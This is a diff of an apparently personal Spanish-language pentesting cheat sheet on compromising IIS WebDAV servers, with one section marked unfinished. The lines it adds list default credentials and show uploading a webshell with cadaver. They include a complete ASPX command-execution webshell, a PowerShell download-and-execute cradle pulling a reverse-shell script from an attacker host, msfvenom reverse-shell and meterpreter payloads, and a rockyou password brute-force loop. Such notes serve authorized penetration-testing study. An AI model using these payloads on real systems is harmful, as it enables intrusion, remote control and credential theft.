@@ -2,82 +2,166 @@
 
 Tags: #IIS #WebDav #Servidor #Windows 
 
-* IIS = Internet Information Services y  es un servidor web para el sistema operativo Windows.
-	* Soporta extensiones de archivos ejecutables:
-		* .asp
-		* .aspx
-		* .php
-	* Archivos de configuración:
-		* web.config
-		* .htaccess
-		* .ini
-		* .config
 
 ```bash 
-❯ browsh --startup-url http://IP/Default.aspx/    # Enumeracion del buscador de un IIS en forma de GUI
+# Credenciales por defecto 
+	admin:admin
+	administrator:administrator
+	webdav:webdav
+	webdav:password 
+	user:password
 ```
 
-Necesitamos credenciales validas para poder entrar al WebDav en la web
 ```bash 
-❯ http://IP/webdav/
+# Rutas comunes en web 
+http://<IP>/webdav/
+http://<IP>/WebDAV/
+http://<IP>/webdav
+http://<IP>/WebDAV
+
+NOTA:
+	- Se necesitan credenciales validas para ingresar al WebDav en la web
 ```
 
-## Webshell en un IIS
+```bash 
+# Pero en IIS WebDAV normalmente no implica que exista literalmente una carpeta /webdav/. Puede estar habilitado sobre el sitio raíz o sobre un virtual directory.
+http://<IP>/
+http://<IP>/uploads/
+http://<IP>/files/
+http://<IP>/documents/
+http://<IP>/shared/
+http://<IP>/web/
+```
+
+## Tools comunes 
+
+* [Browsh](https://github.com/browsh-org/browsh)
 
 ```bash 
-/usr/share/webshells/                # Ruta de la Webshell, estas son aplicaciones que se ejecutan en la web de forma interactiva y asi poder ejecutar comandos 
+- davtest      # Usada para escanear, autenticar y explotar un WebDAV
+- cadaver      # Soporta la subida y bajada de archivos, visualización, editar, mover/copiar, borrar, manipular y bloqueo
+```
 
-	# asp, aspx, cfm, jsp, laudanum, perl, php
+```bash 
+# Enumeración del buscador de un IIS en forma de GUI
+❯ browsh --startup-url http://IP/Default.aspx/    
+```
+
+## Cadaver 
+
+Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usuario y password validos para la autenticación. 
+
+```bash 
+# Acceder al contenido de la web con credenciales  
+❯ cadaver http://IP/webdav   
+	❯ ?       # Mostrar los comandos disponibles 
+	❯ put webshell.aspx    # Subir una webshell (Colocar la ruta)
+	❯ exit    # Salir 
+
+NOTA: 
+	- Soporta extensiones ASPX, ASP
+```
+
+## Cadaver forma 1 - Revershell 
+
+```bash 
+❯ cadaver http://IP/webdav   # Conectarse al WebDav 
+	❯ ?       # Mostrar los comandos disponibles 
+	❯ put webshell.aspx      # Subir una webshell (Colocar la ruta)
+	❯ exit    # Salir 
+
+
+# Ejecutar un comando despues de subir la webshell 
+	http://IP/webshell.aspx?cmd=whoami 
+```
+
+```bash 
+# Webshell clásica 
+<%-- cmd.aspx → webshell básica para IIS --%>
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<% 
+    string cmd = Request.QueryString["cmd"];
+    if (cmd != null) {
+        Process p = new Process();
+        p.StartInfo.FileName = "cmd.exe";
+        p.StartInfo.Arguments = "/c " + cmd;
+        p.StartInfo.UseShellExecute = false;
+        p.StartInfo.RedirectStandardOutput = true;
+        p.Start();
+        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
+        p.WaitForExit();
+    }
+%>
+```
+
+* [Invoke-PowerShellTcp.ps1](https://gist.github.com/PwnPeter/cb3becedd8b8ce1f80e189760ddeb047)
+
+```bash 
+# Revershell
+http://<IP>/webshell.aspx?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://<IP_KALI>/Invoke-PowerShellTcp.ps1')"
+
+NOTA:
+	- Compartir en Kali el 'Invoke-PowerShellTcp.ps1'
+	- Recibir con Netcat la Revershell 
+```
+
+## Cadaver forma 2 - Revershell  ????? TERMINAR
+
+```bash 
+❯ cadaver http://IP/webdav   # Conectarse al WebDav 
+	❯ ?       # Mostrar los comandos disponibles 
+	❯ put /home/user/Dowloads/webshell.aspx      # Subir una webshell (Colocar la ruta)
+	❯ exit    # Salir 
+
+
+# Ejecutar un comando despues de subir la webshell 
+	http://IP/webshell.aspx?cmd=whoami 
+```
+
+```bash 
+# Revershell (Forma 2)
+# Solo se sube este archivo y se ejecuta desde la web 
+
+# Creación de una Revershell stageless 
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f exe -o reverse.exe
+
+
+
+NOTA:
+	- Rutas comunes donde subir el archivo en IIS
+		C:\inetpub\wwwroot\          → raíz del servidor web → acceder en http://IP/cmd.aspx
+C:\inetpub\wwwroot\uploads\  → si hay directorio de uploads
 ```
 
 ## Davtest
 
-```bash 
-* davtest           # Usada para escanear, autenticar y explotar un WebDAV
-* cadaver           # Soporta la subida y bajada de archivos, visualizacion, editar, mover/copiar, borrar, manipular y bloqueo.
-```
-
 Esta tool crea un directorio en el servidor y va subiendo archivos con diferentes extensiones además de ver cuales se pueden ejecutar. 
 ```bash 
-❯ davtest -auth <user>:<passwd> -url http://IP/webdav    # Necesitamos credenciales validas, y nos checara que tipo de archivos puedes subir y ejecutar en el servidor 
+# Se necesitan credenciales 
+❯ davtest -auth <user>:<passwd> -url http://IP/webdav 
+# Enumera extensiones de archivos que se pueden subir   
 ```
 
 ```bash 
-❯ cadaver http://IP/webdav           # Puedes acceder al contenido del servidor WebDAB, te preguntara las credenciales, esta tool te desplegara una consola
-	❯ put /usr/share/webshells/asp/webshell.asp      # Asi subimos la webshell al servidor Webdav
+# Se necesitan credenciales 
+❯ davtest -url http://127.0.0.1 -auth admin:password  
 ```
 
 ```bash 
-❯ davtest -url http://127.0.0.1 -auth admin:admin     # Debemos de tener el usuario y passwd validos para poder usar la tool
-
-	# 1er admin = Usuario 
-	# 2do admin = passwd
-
+# Fuerza bruta con Davtest 
 ❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done
-
-# Ataque de Fuerza Bruta para encontrar la passwd con el comando davtest
-
-❯ cadaver http://127.0.0.1     # Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usaurio y passwd validos para la autenticacion 
-	❯ mkdri test              # Podriamos crearnos dir en los cuales podemos colocar un recurso 
-	❯ cd test 
-	❯ put webdav.txt          # Podemos subir un archivo 
 ```
 
-## Crear archivos maliciosos para un Webdav  
+## Archivos maliciosos para un Webdav  con MSFVenom
 
 ```bash 
-# Estos archivos son el equivalente de un archivo cmd.php en un servidor Apache de Linux que te crean una Revershell. Para los aspx/asp funcionan como una Revershell pero para un IIS en Windows.
-
+# Creación de una Revershell 
 ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f aspx -o reverse.aspx    # Stageless 
-	# Si la maquina no es x64, podemos quitar esa parte en el payload y convertirla a x86
-	# Recibiremos la Revershell con 'Netcat'
+	# Si la maquina no es x64, quitar esa parte en el payload y convertirla a x86
 
 ❯ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.1 LPORT=443 -f exe -o reverse.exe  # Stageless  
-	# Recibiremos la Revershell con 'Metasploit' usando el modulo de 'multi_handler' y nos dara una consola con 'Meterpreter'
-	# Esta Revershell la transferiremos desde nuestra maquina de atacante con python3 y en la maquina victima lo descargaremos con 'Certutil.exe' en el dir 'C:\Users\Public\Downloads' para despues ejecutarlo y obtener la Revershell
-	# En 'Metasploit' cuando usamos el 'multi_handler' debemos de cambiar al 'Payload' que colocamos en el comando 
-	# Esto lo hacemos en las maquinas Windows  
-	
+	# Recibir la Revershell con 'Metasploit' usando el módulo de 'multi_handler' para obtener una consola con 'Meterpreter'	
 
 ❯ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.68.1 LPORT=443 -f asp > shell.asp
 	# p = PLayload 
